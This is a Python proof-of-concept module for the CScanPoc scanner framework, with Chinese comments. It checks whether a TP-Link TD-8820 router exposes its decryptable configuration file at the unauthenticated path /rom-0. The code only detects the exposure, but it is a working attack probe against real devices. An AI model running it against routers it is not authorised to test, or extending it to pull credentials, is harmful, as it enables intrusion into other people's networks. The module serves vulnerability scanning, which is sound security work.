# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.parse
import time
import re


class Vuln(ABVuln):
    vuln_id = 'TP-Link-Router_0001'  # 平台漏洞编号，留空
    name = 'TP-Link-Router 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-09-15'  # 漏洞公布时间
    desc = '''  
        TP-Link-Router TD-8820路由器未授权下载配置文件可解密。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TP-Link-Router'  # 漏洞应用名称
    product_version = 'TD-8820'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ddbf75a9-ceb2-4812-b356-130afafa387c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            """
            POC Name  :  TP-link TD-8820 配置文件下载 可获得密码
            Author    :  a
            mail      :  a@lcx.cc
            Referer   :  http://www.wooyun.org/bugs/wooyun-2014-075723/
            """
            hh = hackhttp.hackhttp()
            p = '/rom-0'
            url = self.target + p
            code, head, res, errcode, _ = hh.http(url)

            if code == 200 and 'application/octet-stream' in head and 'UPnP' in head and 'ether driver etherppp' in res:
                #security_hole(url + '    config file can be download')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
